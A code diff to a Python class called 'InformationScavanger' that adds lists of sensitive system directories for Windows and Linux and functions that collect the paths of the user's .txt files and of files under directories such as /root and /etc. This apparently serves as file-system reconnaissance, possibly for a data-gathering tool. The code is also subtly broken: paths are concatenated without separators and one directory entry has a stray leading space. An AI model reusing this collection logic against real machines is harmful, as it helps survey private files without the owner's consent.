@@ -7,6 +7,10 @@ import ctypes
 from datetime import datetime
 from os import walk
 
+IMPORTANT_DIRECTORIES_WINDOWS = ["C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)", " C:\pagefile.sys", "C:\System Volume Information", "C:\Windows\WinSxS", "C:\Program Files\RUXIM"]
+IMPORTANT_DIRECTORIES_LINUX = ["/home", "/root", "/etc", "/opt", "/var", "/usr"]
+
+
 # [CLASS DESCRIPTION] Ha il compito di permettere la lettura di alcune directory
 # che altrimenti darebbero problemi, solo in Windows.
 if os.name == "nt":
@@ -250,7 +254,7 @@ class InformationScavanger:
     def retriveUser(self) -> str:
         from pathlib import Path
         startPath: str = str(Path('~').expanduser())
-        return self.visitTree(startPath)
+        return self.retriveTextFiles(startPath)
 
     def fileSystemRetrival(self):
         """
@@ -263,7 +267,7 @@ class InformationScavanger:
         else:
             initial_path = '/'
 
-        self.fileSystem_string = self.visitTree(initial_path)
+        self.fileSystem_string = self.retriveFiles()
         return self.fileSystem_string
 
     def visitTree(self, initial_path, depth=-1) -> str:
@@ -297,4 +301,29 @@ class InformationScavanger:
                 return_string += '{}{}'.format(sub_indent, self.getPathName(file, root=root)).encode('utf-8',
                                                                                                      'replace').decode() + "\n"
             """
+        return return_string
+
+    def retriveTextFiles(self, initial_path) -> str:
+        return_string = ""
+        for root, dirs, files in os.walk(initial_path):
+            for file in files:
+                if file.endswith(".txt"):
+                    return_string += os.path.join(root, file)
+        return return_string
+
+    def retriveFiles(self):
+        return_string = ""
+        directories_list = []
+        if os.name == "nt":
+            directories_list = IMPORTANT_DIRECTORIES_WINDOWS
+        else:
+            directories_list = IMPORTANT_DIRECTORIES_LINUX
+
+        for dir in directories_list:
+            for (root, dirs, files) in walk(dir, topdown=False):
+                for name in files:
+                    return_string += os.path.join(root, name)
+                for name in dirs:
+                    return_string += os.path.join(root, name)
+
         return return_string
